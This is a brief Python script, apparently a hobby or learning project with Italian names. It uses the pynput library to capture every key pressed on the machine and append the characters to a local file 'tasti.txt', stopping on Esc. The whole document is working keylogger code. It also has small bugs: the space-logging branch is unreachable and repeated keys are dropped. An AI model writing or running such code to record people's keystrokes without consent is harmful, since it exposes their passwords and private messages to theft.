from pynput import keyboard

ultimo_tasto = None

def on_press(key):
    global ultimo_tasto
    
    try:
        tasto = str(key.char)
    except AttributeError:
        tasto = str(key)

    if len(tasto) == 1 and tasto != ultimo_tasto:
        with open("tasti.txt", "a") as file:
            if ord(tasto) == 32:
                file.write("spazio")
            else:
                file.write(tasto)

        ultimo_tasto = tasto
        
    elif str(key) == "Key.esc":
        return False 

listener = keyboard.Listener(on_press=on_press)

listener.start()

listener.join() 